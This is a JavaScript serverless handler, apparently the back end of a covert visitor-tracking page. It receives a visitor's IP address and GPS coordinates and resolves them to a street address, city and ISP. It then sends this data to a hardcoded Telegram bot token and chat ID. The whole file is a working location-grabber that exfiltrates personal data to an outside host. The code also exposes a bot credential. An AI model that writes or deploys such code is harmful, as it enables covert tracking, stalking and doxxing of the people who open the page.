export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
    
    const { ip, lat, lon, accuracy } = req.body;
    
    const botToken = '8784325672:AAGIjFlqRS_MnMzXaqcgn3lhIzcGaq-1E30';
    const chatId = '8564704937';
    
    let msg = `📍 NEW VISITOR\n━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${ip || '-'}\n`;
    
    if (lat && lon) {
        msg += `📍 GPS: ${lat}, ${lon}\n📏 Akurasi: ${accuracy || '?'} meter\n`;
        try {
            const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
            msg += `🏠 Alamat: ${geo.display_name || '-'}\n`;
        } catch(e) {
            msg += `🏠 Alamat: gagal reverse\n`;
        }
    } else if (ip) {
        try {
            const geo = await fetch(`http://ip-api.com/json/${ip}`).then(r => r.json());
            if (geo.status === 'success') {
                msg += `📍 Lokasi: ${geo.city}, ${geo.regionName}, ${geo.country}\n📡 ISP: ${geo.isp}\n🗺️ Koordinat: ${geo.lat}, ${geo.lon}\n`;
            }
        } catch(e) {}
    }
    
    msg += `\n🕐 Waktu: ${new Date().toISOString()}`;
    
    // Kirim ke Telegram
    const tgResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg })
    });
    
    const tgResult = await tgResponse.json();
    
    // Log ke Vercel console
    console.log('Telegram send result:', tgResult);
    
    // Return response
    res.json({ 
        status: 'ok', 
        telegram: tgResult,
        data: { ip, lat, lon, accuracy }
    });
}
